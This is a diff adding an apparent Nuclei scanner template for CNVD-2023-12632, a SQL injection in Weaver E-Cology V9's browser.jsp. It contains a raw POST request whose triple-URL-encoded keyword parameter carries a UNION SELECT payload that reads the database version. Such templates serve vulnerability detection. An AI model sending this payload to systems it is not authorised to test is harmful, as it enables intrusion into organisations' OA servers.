@@ -1,0 +1,33 @@
+id: CNVD-2023-12632
+
+info:
+  name: E-Cologysql
+  author: expyoyo
+  severity: high
+  description: 泛微OA E-Cology V9 browser.jsp SQL注入漏洞
+  reference:
+    - https://blog.csdn.net/qq_50854662/article/details/129661544
+  tags: CNVD-2023-12632,E-Cology
+
+requests:
+  - raw:
+      - |
+        POST /mobile/%20/plugin/browser.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: ecology_JSessionid=aaaDJa14QSGzJhpHl4Vsy; JSESSIONID=aaaDJa14QSGzJhpHl4Vsy; __randcode__=28dec942-50d2-486e-8661-3e613f71028a
+      
+        isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SQL'
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/08/28
